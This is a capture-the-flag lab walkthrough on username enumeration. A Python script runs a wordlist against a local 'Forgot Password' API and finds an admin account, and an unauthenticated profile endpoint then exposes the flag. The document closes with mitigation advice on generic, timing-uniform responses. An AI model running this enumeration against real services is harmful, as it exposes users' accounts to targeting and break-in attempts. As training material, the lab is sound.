# Lab 2 - Username Enumeration Walkthrough

**Vulnerability:** Information Disclosure (Username Enumeration)
**Difficulty:** Easy
**Points:** 100

## Challenge Scenario
A "Forgot Password" page leaks whether a user exists in the system or not based on the error messages. We need to find the administrator account and retrieve the flag from their profile.

## Walkthrough

1.  **Analyze the Target:**
    We are presented with a "Forgot Password" page.
    Let's try a random username: `adkjfhkajsdh`. 
    The server responds with: `Username does not exist in our system.`
    
2.  **Enumerate:**
    We can use a wordlist to find valid users. The server returns a different message if a user *does* exist.
    Using Burp Intruder or a script against `/api/forgot-password`:
    
    *Python Script Example:*
    ```python
    import requests
    
    url = "http://localhost:8002/api/forgot-password"
    usernames = ["admin", "administrator", "root", "system_admin_09", "johndoe"]
    
    for user in usernames:
        res = requests.post(url, json={"username": user})
        if "does not exist" not in res.text:
            print(f"Found valid user: {user}")
    ```
    
    The script reveals that `system_admin_09` is a valid user.
    
3.  **Retrieve Flag:**
    Now that we know the admin username, we can check if there's a profile endpoint.
    A common REST convention is `/api/profile/<username>`.
    Sending a `GET` request to `http://localhost:8002/api/profile/system_admin_09` reveals the JSON profile, which contains the secret flag.

## Mitigation
To prevent Username Enumeration, authentication endpoints (Login, Forgot Password, Register) must return **generic, identical responses** regardless of whether the user exists.
For example, a forgot password endpoint should always say: "If that account exists, a reset link has been sent," and it should take the exact same amount of time to respond (to prevent timing attacks).
